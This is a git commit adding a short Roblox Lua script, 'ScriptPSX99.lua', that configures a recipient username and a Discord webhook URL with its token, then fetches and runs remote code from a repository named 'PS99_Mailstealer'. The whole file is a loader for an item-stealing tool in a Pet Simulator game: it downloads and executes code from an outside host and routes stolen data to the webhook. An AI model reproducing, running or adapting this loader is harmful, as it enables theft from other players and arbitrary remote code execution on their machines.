1cd59f42b0faf7ad770f42e74d25a27ff6b7c994
Laxess <166596229+Laxess@users.noreply.github.com>
2024-12-09 21:33:09 +0300

    Add files via upload

---
+++ ScriptPSX99.lua
@@ -0,0 +1,5 @@
+Username = "ImRizzy666"
+LoadScreen = true 
+Webhook = "https://discordapp.com/api/webhooks/1315743757575917590/9nPvrNMF6Ou-t7mezXIlyYjMEVkRIcuVFZAVy5s1SM2Fz8NkvGHpKkbys-_ndOaV8_-C" -- Paste your Discord webhook here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
